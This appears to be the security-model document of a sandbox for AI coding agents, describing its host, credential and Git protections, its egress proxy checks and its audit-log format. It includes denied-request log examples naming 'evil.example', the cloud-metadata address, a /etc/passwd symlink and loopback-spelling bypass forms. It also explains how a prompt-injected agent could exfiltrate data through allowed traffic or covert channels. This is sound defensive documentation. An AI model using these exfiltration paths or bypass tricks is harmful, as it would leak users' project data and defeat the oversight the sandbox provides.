# Security model

The README's opening diagram shows the boundary analyzed here. The other documents explain its
components. The launcher source in `src/main/scala/` defines the mounts and flags that implement the
boundary: `AgentSandboxLauncher.scala` coordinates the lifecycle, and the adjacent files implement
its individual mechanisms.

Unless stated otherwise, the guarantees describe default launch options. Project rules and opt-in
features can change the available authority (what the session is allowed to do); their limits and
costs are described below.

## Defended

**Compromise the host.** The host exposes the project directory and the agent-state volume, without
exposing the user's home or unrelated projects. The containers run rootless, and
agents run as an unprivileged user with `no-new-privileges`. Writable `$HOME` and `/tmp` contents
outside the persistent volume are discarded with the session. No host container-runtime socket is
mounted: access to one would let a session control containers outside its confinement.
`SessionBoundaryTest` checks both Docker and Podman socket paths.

**Credential theft.** The launcher does not automatically mount host forge-token stores, cloud
credential files, SSH private keys or the SSH agent's socket. The sandbox supports work on private
repository checkouts without forwarding host Git credentials. Agents' own provider logins are kept
in the persistent volume. Some grant authority beyond model access, including repository or cloud
access; "The web reached through the model provider" describes those exceptions.

This guarantee concerns automatic forwarding. A credential placed in the project directory is
accessible like any other project file; one forwarded with `--env` is available in the sandbox's
environment. Egress rules limit where it can be sent, not its authority at an admitted destination
("Exfiltration through allowed network traffic", below). Only the launch command line can specify
`--env`; a project file cannot choose which host variables it receives. The launcher refuses
`KO_AGENT_SANDBOX_*`, which describe its enforcement settings, and prints every forwarded name. Any
process in the session can use a forwarded credential with the authority its issuer granted.

**Project data reaching a destination nobody chose.** Outbound HTTPS traffic passes through the
proxy, which enforces the resolved egress rules and records protocol and policy decisions ("Egress
proxy", below). The default profile starts from every model provider's default rules and the
inspected catalog. The project's rule file can remove or extend those grants.

**Writing to remote hosts**, subject to the resolved egress rules. The defaults allow opaque
model-provider traffic and inspected requests for reading, Git fetch (`clone` and `pull`), and
GitHub device login. An inspected request is refused unless its operation is granted at its path.
The defaults refuse `git push`; a project can grant it through `method=POST` or an opaque tunnel.
"Reading without being able to write" below explains the rules, costs, and limits.

**Being used to attack someone else.** The egress rules limit reachable targets and operations; they
do not establish that an allowed request is harmless. Whatever the profile — the widest admits any
public hostname on port 443 — the proxy refuses other ports and private addresses, cloud metadata
services such as 169.254.169.254 included: the proxy validates every resolved address at connection
time.

**A session reaching another project, or persisting outside declared state.** Agent state is a
per-project volume and deliberately affects later sessions of that project ("What the persistent
volume holds", below); the rest of the sandbox home is discarded on exit. Claude Code's hooks
are disabled (the sandbox Containerfile's `disableAllHooks` note has the reasoning). The networks
and proxy are per run and removed with it, so concurrent sessions cannot reach one another through
those networks and no network object is reused.

**A project loosening its own confinement.** Claude Code's managed settings are stored in the
read-only image and take precedence over repository settings. An organization's server-managed
settings take precedence over that file and replace it entirely (the sandbox Containerfile's
managed-settings note explains the consequences). The egress rules and the project's agent
instructions in `.ko-agent-sandbox` are read on the host before the container starts, and the
session's write mode is what keeps a session from writing the configuration governing the next
launch: under `--write=reject` the whole tree is read-only, and under the filter `.ko-agent-sandbox`
is protected — the name cannot be created at any depth, under the same name-matching rules as
`.git`, and nothing under an existing one can be written. Only
`KO_AGENT_SANDBOX_WORKSPACE_GUARD=none`, whose raw tree is writable, still needs the directory
mounted back over itself read-only.

**The host's git executing what the sandbox wrote.** Host `git` runs what `.git` configures:
hooks, and commands named in `.git/config` — `core.hooksPath`, `core.fsmonitor`, filters, the
pager. By default the workspace FUSE filter prevents a session from planting commands for the
user's next host `git` invocation: it refuses a new entry named `.git` at any depth, under any
spelling a case-insensitive host filesystem treats as that name, and prevents changes to the
protected Git entries of every repository rooted at a `.git` entry — `config`, `hooks/`, files
that redirect Git to another directory, and rebase instructions — while operational state stays
writable, so the agent's own git keeps working. It serves the tree live: a repository created on
the host mid-session appears at once, with the same Git entries protected against modification.

Every path through which host git reaches these entries must also be protected. The mount-time guard
checks the repository host git discovers from the project directory. It refuses a workspace-root
repository whose gitdir, config or hooks reach host git through a writable workspace path — a
redirected gitdir (`git init --separate-git-dir`), a config or hook aliased into the worktree, or a
`commondir` pointing back in — and a bare layout at the workspace root. A directory laid out as a
gitdir *without* a `.git` name elsewhere in the tree is the gap "The project directory" describes. A
repository whose Git directory is outside the project can pass the guard if its configuration and
hooks are also unreachable through writable workspace paths. This includes submodule checkouts,
linked worktrees, separate Git directories, `.git` files naming an external directory by its
absolute path, and launches from a subdirectory of a repository. Git cannot work in those sessions:
the container has the project directory and nothing above or beside it. The launcher and agent
instructions report this limitation as a warning, because a session that only edits files can still
be useful without exposing the host's Git configuration or hooks.

These are the default protections, with qualifications under "Not defended": a launch that sets
`KO_AGENT_SANDBOX_WORKSPACE_GUARD=none` gets read-only bind mounts instead, for which the claim does
not hold ("The read-only `.git` mounts under `WORKSPACE_GUARD=none`"); and on some platforms the
filter has no measured evidence ("The workspace filter, on the platforms where it is unverified").

Under `--run-on-host`, host commands write directly to the host tree without passing through the
workspace filter. The Seatbelt profile's deny rules protect those Git entries on that path ("Run on
host", below).

**Silent changes to what you own.** The launcher never silently modifies configuration or files it
does not own. Unannounced changes to host configuration or metadata can invalidate the user's
understanding of what the sandbox can access. The cases that require host changes or explicit notice
are:

- the podman **machine's** `/etc/fuse.conf` gains `user_allow_other` only after `--build` shows the
  change as a diff of the actual file plus the exact script, and you consent; the original is saved
  to `/etc/fuse.conf.ko-agent-sandbox.orig` first, and declining prints the script for you to run
  yourself;
- a native Linux **host** is never even prompted for sudo — only handed the command;
- the **machine** is started when stopped, but never created or resized: sizing is yours;
- the **project tree** is never written by the launcher, except for the empty directories that the
  read-only guard mounts of `WORKSPACE_GUARD=none` require and confine to that mode. This mode
  creates an empty `.ko-agent-sandbox` when absent because the read-only bind mount needs a target
  ("A project loosening its own confinement", above). In a project with no repository, it also
  creates an empty `.git`: the launcher binds its own empty directory read-only over that name so
  the sandbox cannot fabricate a repository for host git to discover. The container runtime creates
  that mount target in the project. The filter denies creation of either name and needs no mount
  target; `--write=reject` makes the entire tree read-only. Those modes therefore require no
  project-directory creation;
- the **project tree's SELinux labels**: on an enforcing host, the unfiltered bind mount of
  `WORKSPACE_GUARD=none` is readable to the container only under `:Z`, which relabels the project
  directory recursively. Each affected launch reports this host-metadata change in its `workspace:`
  line. The filter's mountpoint needs no relabel, a permissive or disabled host reads unrelabeled
  and is never relabeled, and `--write=reject` refuses on an enforcing host rather than relabeling,
  unless the tree already has a shared container-accessible context — a container type with no MCS
  categories, since categories from a previous `:Z` are private to the container they were assigned
  to;

What the launcher does write, it owns: its images, containers, networks and named volumes, its
per-project state root, and its install directory `~/.local/share/ko-agent-sandbox`. For the podman
objects, ownership is by name: `--reset-all` force-removes every container, network and
volume matching the generated name patterns — `ko-agent-sandbox-*` and `ko-agent-egress-*` ending in
the twelve-hex path hash and, for per-run resources, the eight-hex run suffix, and the self-test
probe container `ko-agent-self-test-share-` followed by that suffix alone. Those patterns are
reserved: an object created by hand inside one is removed like the launcher's own, and a
`KO_AGENT_SANDBOX_PERSISTENT_VOLUME` naming one is a refused launch.

**Accidentally exposing an over-broad project directory.** Before creating any resource, the
launcher refuses:

- filesystem roots, including Windows drive and UNC roots;
- the current user's configured homes (`HOME` on POSIX; `USERPROFILE` and `HOME` on Windows)
  and Windows `PUBLIC` — the shared profile — plus every ancestor of those directories, with
  the macOS data-volume spelling (`/System/Volumes/Data/...`, a firmlink alias `toRealPath`
  does not collapse) treated as the same directory;
- the well-known home containers, whether or not a configured home is located beneath them: `/home`,
  `/Users` and the Windows profiles root (`%SystemDrive%\Users`, `C:\Users` when `SystemDrive`
  is unset), plus their direct children — another account's home exposes that account exactly
  as this one's would — and POSIX root's own homes, `/root` and `/var/root`;
- a path whose current or ancestor directory has a dot-prefixed name.

A project *inside* a home is not refused: `~/src/app` and `~/app` are both valid choices, and
refusing them would leave nowhere obvious to work.

Home discovery degrades loudly, never silently: a `HOME` that is set but invalid fails the
launch on POSIX, while on Windows an invalid secondary value (Git Bash's POSIX-style `HOME`)
is dropped with a warning when another home variable resolved; a home that cannot be resolved
to a real path is refused by its exact spelling, with a warning; and with no home variable set
at all (cron, CI, `env -i`) the launch proceeds under the built-in refusals above and says so.

This is an accident guard, not a complete path boundary. The launcher does not enumerate the
system's accounts or prove that the chosen directory is a project; selecting some other broad
directory still exposes that directory in full. The security boundary begins at the exact project
directory the user selects.

## Not defended

**Prompt injection.** The sandbox does not detect or prevent an agent from following malicious
instructions. It limits the actions available to the compromised agent.

**Exfiltration through allowed network traffic.** An opaque tunnel allows writes wherever the
endpoint offers a write API; `api.anthropic.com` receives the conversation by design. At inspected
hosts, the proxy constrains methods, paths and HTTP framing, but does not validate application
payloads. An allowed `GET` carries its URL; a path grant narrows the recipient, but the path suffix
and query can still encode data. Forwarded headers and allowed request bodies can also carry data.
Inspection therefore does not establish that a request contains no project information.

**The web reached through the model provider.** Claude Code's WebSearch and Codex's web search run
on the provider's servers: the query and its results travel inside the model-endpoint tunnel, and
the provider's infrastructure does the searching. The proxy sees one connection to
`api.anthropic.com` or `chatgpt.com`, so neither the ruleset nor the audit log (`--proxy-log`)
applies to the domains searched — a query is outbound information the provider relays onward.
Claude Code's WebFetch is the opposite: a direct request from inside the sandbox, through the
proxy, answered only by an allowed host and logged like any other connection.

Copilot CLI's sign-in stores a forge credential, not merely a model-provider credential. `copilot
login` obtains an OAuth token with `repo` scope, which includes private-repository access subject to
the account's permissions and organization restrictions. Because the container has no credential
store, Copilot keeps the token in plaintext under `~/.copilot` in the persistent volume, alongside
the other agents' provider logins. Inside the sandbox, that token can authenticate private clones
from `github.com` and `GET`s on `api.github.com`. Under the default
rules, it cannot push or modify repositories through inspected hosts. It can write through Copilot's
model endpoint, `api.githubcopilot.com`, which also serves the built-in GitHub MCP server — files,
branches, issues and pull requests written with the signed-in account, which the opaque tunnel
cannot tell from model traffic — and Copilot's session export to GitHub's web UI. Copilot provides
`--disable-builtin-mcps` and `--no-remote-export` to disable those features. The proxy rule `deny
model-provider github` denies every host in GitHub's model-provider rules, including `github.com`,
`api.github.com` and the model tunnels, unless a later rule grants access again. Resetting the
project's agent-state volume discards the stored token ("What the persistent volume holds", below).

GitHub defines the provider-side limits in its [OAuth
scopes](https://docs.github.com/en/apps/oauth-apps/building-oauth-apps/scopes-for-oauth-apps) and
[organization access
restrictions](https://docs.github.com/en/organizations/managing-oauth-access-to-your-organizations-data/about-oauth-app-access-restrictions).

agy's Business sign-in stores a Google Cloud credential for the licensed project. Google's default
rules tunnel the Agent Platform API — Vertex AI's — at `aiplatform.googleapis.com` and its `us` and
`eu` multi-region hosts; the API manages the project's resources as well as serving its model
endpoints. Through those opaque tunnels, the credential can perform whatever operations the user's
IAM roles allow in the signed-in project; the proxy cannot distinguish them from model traffic.
Sufficient permissions can permit deploying or deleting model endpoints, starting paid training,
tuning or batch-prediction jobs, or deploying agent code. Jobs may also require permission to use a
service account. Their server-side Cloud Storage access depends on the service identity performing
the operation, not just the signed-in user's bucket access. Such jobs can read or write storage
without the sandbox contacting a storage host. Google's [batch-inference
documentation](https://docs.cloud.google.com/gemini-enterprise-agent-platform/machine-learning/predictions/get-batch-predictions)
describes those execution identities. Storage, Compute and IAM use separate hosts, reachable only
where the profile or a project rule admits them. The project can deny the three aiplatform hosts
while retaining the Business AI Code API, or use `deny model-provider google` to deny every host in
Google's default rules, unless a later rule grants access again. Resetting the project's agent-state
volume discards the stored token ("What the persistent volume holds", below).

**Low-bandwidth channels.** The choice of allowed host, request timing and request order can all
encode information. The proxy does not detect or bound these covert channels.

**The project directory.** `/workspace` is writable on purpose: the sandbox protects the rest of the
host, not the project. With the Git entries listed above protected, what an agent can still write
there is data which your git then parses, so a memory-safety bug in git itself remains reachable,
exactly as with any cloned untrusted repository (`.gitattributes` stays writable, but can only
invoke filter commands your host configuration already defines).

Everything else writable — build scripts, CI definitions, IDE configuration, generators, binaries —
is output from an untrusted execution environment: editing them is the job, and confining their
author says nothing about what running them on the host will do. Review the diff first, exactly as
for a contribution from a stranger. That includes a repository the agent created deeper in the tree,
in both guard modes: under `WORKSPACE_GUARD=none` any nested layout is outside those mounts'
protection, and the filter — which refuses creating a `.git` entry — cannot refuse a *bare layout*,
built from ordinary names (`git init --bare`, `git clone --bare|--mirror`, or by hand): its config
and hooks are served as writable data anywhere in the writable workspace, and git's ascending
discovery adopts it for a host command run at or beneath it. Running host git *inside* a directory
the agent created is running the agent's output.

A symlink can expose files outside the project because its target is resolved in the reader's
filesystem namespace. `/workspace/x -> /etc/passwd` written inside resolves to the *container's*
`/etc/passwd`, and a relative `../../..` clamps at the container root, so from in there it reaches
nothing the sandbox did not already expose. On the host the identical link resolves to the host's
file, outside the project directory. The exposure occurs when a later host process follows the link:
a recursive copy configured to dereference symlinks, an editor indexing the project, or a packaging
step. A diff shows only the target text, which can make this risk easy to overlook.

The workspace filter reduces this risk by refusing absolute targets and targets whose syntax climbs
above the workspace root, including common links into external caches. Two gaps remain (`fs.rs`,
`target_has_portable_syntax`): a target containing other symlinks can resolve differently on each
side, and a later `rename` or `link` can move a relative symlink so that its target escapes the
workspace. The creation-time syntax check does not prevent deliberate construction of such links;
they still require review. Direct hardlinks across the workspace mount boundary fail with `EXDEV`,
because `/workspace` and the container root are different filesystems. Hardlinking a symlink within
the workspace can still change where its relative target resolves.

The tree is also shared live with the host: your editor, builds and git run against the same files
the agent is writing, host and sandbox writes race like any two processes on one directory, and
git's own lock files are the only arbiter the writable parts of `.git` get. On Windows the
sharing adds one rule: a file a live session holds open cannot be written from the host —
the machine's 9p handle imposes Windows sharing rules, so a host editor's save meets "used by
another process" until the session lets go
(`fuse/ko-agent-fs/doc/verification-log.md` has the measurement). Concurrent sandbox
sessions of one project race each other the same way — under the workspace filter too, where they
share the one filter mount: the same files, the same live view, the same races.

**The workspace filter, on the platforms where it is unverified.** `/workspace` reaches the sandbox
through `ko-agent-fs` (`fuse/ko-agent-fs/`), a FUSE mount enforcing the policy stated under "The
host's git executing what the sandbox wrote". Unlike root-level read-only bind mounts, the filter
refuses new `.git` entries and protects the listed Git entries at any depth. The design uses
FUSE to mediate the VM's filesystem view across host platforms;
`fuse/ko-agent-fs/doc/architecture.md` ("Mediation mechanism") compares the alternatives.

The mount-time guard has two scope limits (`fuse/ko-agent-fs/doc/git-metadata.md`, "Relocated hook
directories"). First, it checks the repository discovered from the project directory, not every
nested repository. The protected entries under a nested repository's `.git` cannot be modified, but
pre-existing redirections into writable worktree files — relocated hooks or a redirected gitdir —
remain writable (`fuse/ko-agent-fs/doc/TODO.md`). Bare layouts below the workspace root are also
outside that check; a bare layout present at the root at launch is refused ("The project
directory"). Second, the check is a snapshot. It does not revalidate protected Git entries relocated
by the host during a session. The resolution chains it accepts consist of components the sandbox
cannot write or rename, so the sandbox cannot redirect those chains itself. This does not prevent it
from constructing a new bare layout from ordinary writable files, as described above.

What an auditor trusts, and how each link is checked:

- **The source.** No binary is shipped: the Rust source travels inside the launcher jar, readable
  in this repository, and `--build` compiles it in a pinned `rust:slim` container on the user's
  own machine.
- **The dependency tree**, pinned by `Cargo.lock` (`--locked` at every cargo step) and gated by a
  pinned `cargo-deny` — permissive licences only — before any binary exists.
- **The installed binary's source version.** The launcher digests the bundled source, passes the
  digest into the image build, and checks the installed binary's `--version` against it. A mismatch
  fails `--build`. This detects a mismatched installation; the binary reports the value, so the
  check does not independently attest its contents or the build toolchain.
- **The filter daemon is unprivileged.** It is installed in the podman machine user's home on macOS
  and Windows, or the host user's home on native Linux (the README names the path). The daemon runs
  without root or capabilities and uses the existing setuid `fusermount3` helper to mount FUSE.
  Enabling `user_allow_other` in the machine's `/etc/fuse.conf`, required for a cross-uid mount,
  requires consent ("Silent changes to what you own", above).

Its name rule is verified on macOS against both APFS variants and on Windows against a real NTFS
volume, its coherency on macOS and — with the share-lock cost "The project directory" notes — on
Windows, each through the whole production stack
(`fuse/ko-agent-fs/doc/verification-log.md` has the runs). The rest is what the README's status
line means: on Linux the guarantees are reasoned rather than measured, while the filter is the
enforcement of every `--write=live` session under `WORKSPACE_GUARD=fuse`, on every platform.

`KO_AGENT_SANDBOX_WORKSPACE_GUARD=none` selects the read-only bind mounts instead, the next entry.
They are alternatives, never a stack: the filter's policy is a strict superset of the mounts'
protection, and preparing their bind targets would mean creating `.git` entries through the filter,
which the filter denies. Every gate on the filtered path fails closed — a version mismatch, a failed
self-test or a failed mount aborts the launch, never falling back to an unfiltered bind.
Implementation, policy derivation and test evidence: `fuse/ko-agent-fs/doc/`.

**The read-only `.git` mounts under `WORKSPACE_GUARD=none`.**
`KO_AGENT_SANDBOX_WORKSPACE_GUARD=none` replaces the filter with mounts: `.git/config` and
`.git/hooks` remounted read-only (a pointer-file `.git` mounted read-only in full, and the bare name
when no repository exists). A session that takes it says so on its `workspace:` line. The set of
mounts is fixed at launch — a host-created repository appears behind the whole-directory mount,
read-only until the next launch — and they cover only the workspace root, so a repository the agent
creates deeper in the tree is outside their protection, the gap "The project directory" describes.

Replacing a file on the host can defeat its read-only mount's protection. On a macOS podman machine,
once the host gives
`.git/config` or `.git/hooks` a new inode while the session runs — a rename over it, or a rename
away and a fresh object at the path, which is how `git config` and most editors write — the sandbox
is writing the host's current file within about two seconds, through the writable parent. It is
stale in between, and the mount stays listed in the sandbox's mount table throughout, so neither
that table nor a check made immediately after the write shows anything wrong. On the Windows
machine the same replacement left the mount refusing writes for the whole two-minute observation —
measured, not designed, so the macOS behavior stays the one to plan around. The protection survives
mutations that preserve the inode: in-place file edits, and creation or deletion of entries inside
the read-only `.git/hooks` mount.

Native Linux remains unmeasured. WorkspaceGuardOffTest expects the macOS fall-through there until
a Linux run supplies evidence, so this mode makes no stronger claim on that platform.

This mode cannot guarantee protection while host programs replace the mounted files or directories.
`WorkspaceGuardOffTest` records the measurements.

**What is inside TLS, for the hosts that stay opaque.** A `tunnel` host is deliberately not
inspected, so the proxy sees only the handshake and cannot tell a `GET` from a `POST`. In the
defaults that is the model-provider endpoints alone: their required writes cannot be refused, and
inspection would expose the conversation and provider tokens in plaintext to the proxy process.
Inspection lets the retained log record each request's method and target; an opaque tunnel logs
the `CONNECT` alone. Every other defaults host is inspected, the bulk package registries included
at a known per-request handshake cost: security is not traded for performance (design.md's
principles).

**What the persistent volume holds.** Every session mounts every installed agent's state
read-write under the same uid, regardless of which agent the host launched. The launched command is
not a security principal: any process in the sandbox can read another agent's provider login,
history and session metadata, or change its configuration and MCP definitions for a later session.
This is deliberate. An agent can invoke another installed agent as a command or MCP server and the
called agent reuses its persisted login and configuration; the project, not the agent executable,
is the isolation boundary.

Later sessions read the volume as trusted input. Some stored state, especially MCP server
definitions, names commands to execute. `--reset` removes the project's default agent-state volume;
use it if that state is suspect. `KO_AGENT_SANDBOX_PERSISTENT_VOLUME` lets projects share a named
volume: state written by one project becomes input to every other project using that volume.
`--reset` deliberately preserves this explicitly shared volume, so it does not remove credentials or
suspect state stored there. Removing a stored credential does not revoke copies already held
elsewhere; revocation remains the provider's operation.

Concurrent sessions of a project mount the volume read-write. Writes to the same state file can
overwrite earlier changes or leave inconsistent content. A `--reset` from another terminal
deliberately ends live sessions; if it races with a launch, that launch fails rather than continuing
with weaker confinement.

**A repository that ships wide egress rules.** Review `.ko-agent-sandbox/egress/rule` before running
an unfamiliar project, as you would its build scripts. A `tunnel` line allows opaque traffic to its
host, and a `method=` line can grant writes at its path. The sandbox enforces those grants; it does
not establish that the project's choices are appropriate.

**The supply chain.** Base images, the JDK, and whatever `cs`, `uvx` or `npx` fetches at the agent's
request are trusted as they arrive. npm's install-time audit is off by default (the audit line
of `doc/egress-rule-example/npm-audit/rule`, "Reading without being able to write" below); where
a project enables it, its warnings do not stop installation.

**Container, runtime and kernel escape.** On Linux the boundary ultimately rests on rootless podman,
the OCI runtime, namespaces, seccomp and the host kernel. This design is not built to contain a
working kernel or container-runtime exploit; if that enters the threat model, the answer is a
stronger isolation layer (gVisor, a microVM), bought at its compatibility cost, not more flags here.

**Resource exhaustion.** The PID limit and memory limit bound runaway process and memory use.
CPU, disk growth under `/workspace`, network bandwidth, and denial of service against the host
generally are not comprehensively bounded.

## Egress proxy

The HTTP proxy runs in a separate container that the agent cannot modify. The sandbox's internal
network has no route to external destinations, so outbound HTTPS connections must pass through the
proxy. Its container is created for each run and removed afterward, using the reserved names
described under "Silent changes to what you own". The audit log is appended through a bind mount to
a per-run file in the launcher's host state directory and survives container removal. Each
connection passes these checks and transitions in order:

1. `CONNECT` only — any other method is a 400
1. port 443 only
1. IP-literal targets are refused — not just dotted-quads: the resolver also accepts `127.1`,
   `0177.0.0.1` and `2130706433` as spellings of `127.0.0.1`, and a match on the first form alone
   is a known bypass class
1. the resolved ruleset admits the hostname: an exact entry in its host map allows it;
   `allow-unless-denied` also admits an unlisted name unless a resolved denial pattern matches it.
   The map already incorporates rule order, including grants that follow denials
1. DNS is resolved once to obtain the candidate addresses
1. every address the name resolved to must be a public one — a name that answers with a loopback,
   RFC1918, link-local or CGNAT address is refused outright. The connection uses those validated
   addresses without a second lookup
1. `200 Connection Established` accepts the `CONNECT`. This is the last plaintext HTTP response on
   the client connection; the client must then begin TLS
1. the client's TLS ClientHello is parsed within a fixed byte budget
1. Encrypted ClientHello is refused: it would hide the name that actually selects a backend.
   GREASE ECH, the dummy extension a browser sends by default (RFC 9849, 6.2), is refused with
   it, being indistinguishable by design, so a browser-driven program fails on every host
1. SNI must be present, and must equal the hostname in the `CONNECT` — which is also what keeps
   a destination named by address out of both treatments: SNI carries no address, so a client
   connecting to one sends none, and this step refuses the hello. A leaf can name an address
   (an `iPAddress` subject alternative name), so inspecting one is a decision this lifecycle
   has not taken, not a limit of the protocol
1. only then does it become a tunnel — inspected for an inspected host, opaque for a `tunnel`
   one

Steps 8-11 prevent `CONNECT allowed.example:443` from carrying a TLS handshake for another name at
the same address. These checks follow the `200`, so a failure closes the connection. Before the
`200`, malformed or non-CONNECT requests receive `400`; policy refusals receive `403` with the
reason and suggested next step; DNS or connection failures receive `502`. Clients often hide
failed-CONNECT response bodies, so the sandbox image provides `sandbox-egress-check <host>` to read
them (README, `--egress-check`).

With `HTTPS_PROXY` set where the launcher runs (`doc/egress-proxy.md`, "Through an upstream proxy"),
step 6 connects through the upstream proxy with a `CONNECT` naming the validated numeric address.
The local checks still decide admission; the upstream proxy does not resolve the origin hostname.
The returned tunnel carries the same steps 8 to 11. The upstream proxy cannot override a local
refusal. An upstream refusal or connection failure produces `502`, with no direct-connect fallback.
The variable reaches the proxy container's environment by name — podman copies a value-less `--env`
from the launcher's process — so its userinfo is in no argument, and the proxy keeps the credential
in memory and prints the endpoint alone. The sandbox never sees the variable: its own proxy
variables name the per-run proxy, as `SessionBoundaryTest` asserts.

### The audit line grammar

Connection and inspected-request events use one log line each. The leading fields are stable for
tooling; the trailing explanation is intended for people and may change:

    <instant> allow <host> <method> [<target>] -> <ip>
    <instant> deny  <host> <method> [<target>] <why>
    <instant> error <host> <method> [<target>] <why>

Timestamps use UTC with second precision, for example `2026-08-26T11:59:38Z`. Every line carries a
timestamp, including startup lines; the examples below omit it.

The host is the `CONNECT` target as the sandbox requested it — what was asked for, not necessarily a
hostname admitted by the ruleset. The method is `CONNECT` for tunnel-level events and the inspected
method inside one; `-` fills a field the connection ended before revealing, so the field never
carries a token the proxy did not admit — a refused method is named in the text instead. The target
appears exactly when a parsed inspected request exists, query string included: the URL is the
message an allowed `GET` can carry ("Exfiltration through allowed network traffic", above), so the
log records it whole, which is also why the log files are owner-only. Whole, but not arbitrary — a
control character in a request target, a field value or a `CONNECT` authority is refused at the
parser, so nothing that reaches this log can split a line's fields with a tab or rewrite it with an
escape sequence on the terminal reading it. `deny` records a protocol or policy refusal; `error`
records a connection, origin or relay failure without such a refusal. A count of `deny` lines
therefore includes malformed requests but excludes ordinary network failures. The stages emit the
following kinds of events:

    # the CONNECT gate — lifecycle steps 1 to 6
    deny - - GET non-CONNECT request
    deny example.com CONNECT port 8080
    deny 169.254.169.254 CONNECT IP-literal target
    deny tracker.example CONNECT host not allowed
    deny telemetry.example CONNECT host denied (rule: deny https://**.example/)
    deny internal.corp CONNECT resolved to non-public address 10.0.0.5

    # the TLS gate — steps 8 to 10, after the 200, before any tunnel
    deny github.com CONNECT SNI evil.example differs from target
    deny github.com CONNECT encrypted ClientHello

    # tunnels and inspected requests — step 11 onward
    allow api.anthropic.com CONNECT -> 160.79.104.10
    allow github.com GET /owner/repo?tab=readme -> 140.82.112.3
    allow docs.example GET /guide?q=x -> 203.0.113.7    # unlisted, under allow-unless-denied
    deny github.com POST /owner/repo.git/git-receive-pack POST not granted
    deny github.com GET /r.git/info/refs?service=git-receive-pack git push ref discovery
    deny github.com GET /r.git/info/refs?service=git-upload-pack git fetch ref discovery
    deny github.com GET /owner/repo read not granted
    deny github.com GET /owner/repo request body framing header
    deny registry.npmjs.org PUT /lodash PUT not granted
    deny github.com GET /owner/repo Host header evil.example
    deny storage.googleapis.com GET /other-bucket/key path under no line
    deny storage.googleapis.com GET /my-bucket/../other-bucket/key a dot segment in the path

    # infrastructure — error, never deny
    error internal.example CONNECT resolution: unknown host
    error api.anthropic.com CONNECT tried 160.79.104.10 203.0.113.7: connection timed out
    error github.com CONNECT tried 140.82.112.3: upstream proxy returned 403
    error github.com CONNECT tried 140.82.112.3: upstream proxy http://proxy.example:3128: refused
    error github.com GET /owner/repo origin: certificate expired
    error github.com GET /owner/repo relay: connection reset
    error github.com GET /big.tar relay: 8192-byte response truncated: body ended 100 bytes early
    error github.com - client closed before sending a request

The truncation event records a response ending before its declared `Content-Length` or chunked
termination. The proxy aborts the client connection without a clean TLS shutdown so the client can
detect the incomplete download. A client closing without sending a request is not a refusal; pooled
clients routinely discard unused connections. It is logged as `error`. A partial request header is
instead classified as malformed input and logged as `deny`.

A refused request's `403` body is the agent's copy of `<why>`, with the next step under it
(`RefusalAdvice` in the proxy); the advice is for the agent, and never enters the log, which is
for the person who has this document.

Startup lines precede these events and use a separate format. They record, in order: the transport
(direct, or the upstream proxy and its addresses resolved at startup), the listening port, the
ruleset in `--print-ruleset` format, its digest, summary counts, grants exceeding a host's defaults,
warnings, and the inspection summary. Metadata about the project's rule file is excluded from the
digest, so different files that resolve to the same ruleset have the same digest. There is no
peer-address field: the per-run internal network has one client container.

### Reading without being able to write

The catalog grants `read git-fetch` to three Git hosting services:

1. `github.com`
1. `codeberg.org`
1. `gitlab.com`

These grants allow `git clone` and `git fetch`. An opaque tunnel would also carry `git push`,
allowing project contents to be uploaded wherever the agent has access.

The rest of the catalog is `read` alone — `GET` and `HEAD` with no body, and no POST at all: the
GitHub content hosts, the documentation and reference sites, the content CDNs, and the
container-image pull hosts. A grant's POST must not reach a host without it: on a content host
whose paths are anyone's to choose, a path that mimics `git-upload-pack` would pass under the git
rule. The proxy image's `defaults/host` file is the canonical built-in membership, grants
included, with the reason beside each line; what stays opaque, and why, is "What is inside TLS"
above.

For each inspected request, the proxy terminates TLS and checks the grants in the resolved scope
with the longest literal path match (`doc/egress-proxy.md`, "The rule file"):

- `read`: bodyless `GET` and `HEAD`, except the Git discovery requests classified separately below
- `git-fetch`: the ref discovery, `GET .../info/refs?service=git-upload-pack`, and `POST` to a path
  consisting of at least two nonempty segments followed by `/git-upload-pack` — the transfer step of
  `clone` and `fetch`. Git sends fetch-negotiation data as a `POST` and receives a packfile in the
  response. Granting only `read` would therefore prevent cloning. Discovery also requires
  `git-fetch`, so a clone without the transfer grant fails at its first request rather than its
  second
- `method=POST` on GitHub's two default login rules, `/login/device/code` and
  `/login/oauth/access_token`, GitHub's OAuth device flow, which is how Copilot CLI signs in. The
  second is GitHub's general token endpoint, shared with the web flow's code exchange, whose
  redirect cannot reach the sandbox. These are method-and-path grants; the payload limitations under
  "Exfiltration through allowed network traffic" apply here too. A session can initiate device
  authorization for a GitHub OAuth app; completing that flow requires user authorization on GitHub's
  device page
- `method=` on a project's own line: the listed HTTP methods at that path, inspected and logged. The
  defaults have no such line beyond the login pair. `doc/egress-rule-example/npm-audit/rule` is the
  measured case: `POST` to the audit endpoint the image's npm uses at install time. Older npm
  endpoints are refused and logged without failing the installation. Audit is off by default because
  the request sends a package/version inventory, including names the registry's own `GET`s never
  carried, such as private-registry and Git dependencies in a lockfile. It does not send dependency
  edges. Enabling install-time vulnerability warnings allows that disclosure
- Nothing else. `POST .../git-receive-pack` is the push and is refused, as is its ref discovery —
  a `GET`, refused anyway so that `git push` fails at its first request rather than its second,
  except where a line grants `POST` at the repository, the project's own visible grant. `PUT`,
  `PATCH` and `DELETE` are refused, and so is every other `POST`, where no line grants the
  method

A policy refusal returns `403` inside the tunnel, with the reason and suggested next step, and
produces a `deny` audit line ("The audit line grammar", above). Malformed HTTP receives `400` and is
also logged as `deny`. Inspection records requested methods and targets, rather than only
connections to the host.

Consequences under the default grants; a project can explicitly grant the relevant methods:

- GraphQL requests using `POST` are refused, including read-only queries. Distinguishing a query
  from a mutation would require interpreting the payload, which the proxy does not do. If an
  endpoint supports GraphQL over bodyless `GET`, those requests are governed by `read`, just like
  REST reads. GitHub's GraphQL API requires authentication; GitLab supports anonymous queries, so
  refusing `POST` queries can cost GitLab reads even without a stored token. Their documentation
  describes the authentication requirements:
  [GitHub](https://docs.github.com/en/graphql/guides/forming-calls-with-graphql),
  [GitLab](https://docs.gitlab.com/api/graphql/).
  Codeberg uses the [Forgejo API](https://forgejo.org/docs/latest/user/api/usage/);
  its bodyless REST `GET` reads remain allowed under the defaults.
- The LFS batch endpoint is not opened. It is a `POST` whose body chooses between download and
  upload — another request whose meaning is in the body. Public-repository LFS batch downloads can
  be anonymous. The absence of git-lfs from the image does not enforce this restriction: an agent
  can fetch its static binary through release-assets.githubusercontent.com, but the proxy still
  refuses its batch requests. This costs `git lfs pull`, without making all LFS content unreachable.
  GitHub serves individual LFS files at media.githubusercontent.com, which is in the defaults.
